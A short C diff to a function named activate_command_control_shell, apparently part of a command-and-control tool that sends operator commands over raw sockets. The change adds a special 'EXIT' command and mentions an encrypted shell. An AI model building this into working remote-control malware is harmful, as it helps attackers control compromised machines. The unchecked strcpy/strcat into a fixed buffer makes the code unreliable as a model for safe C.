@@ -345,8 +345,15 @@ void activate_command_control_shell(char* argv){
         }                                                                                                                                                                         
         
         char msg[BUFSIZ];
-        strcpy(msg, CC_PROT_MSG);
-        strcat(msg, buf);
+
+        //Global command "EXIT". This part should be moved together with the encrypted shell
+        //global command parser.
+        if(strlen(buf)>3 && strncmp(buf, "EXIT", 4)==0){
+            strcpy(msg ,CC_PROT_FIN);
+        }else{
+            strcpy(msg, CC_PROT_MSG);
+            strcat(msg, buf);
+        }
         packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, msg);
         printf("Sending %s\n", msg);
         if(rawsocket_send(packet)<0){
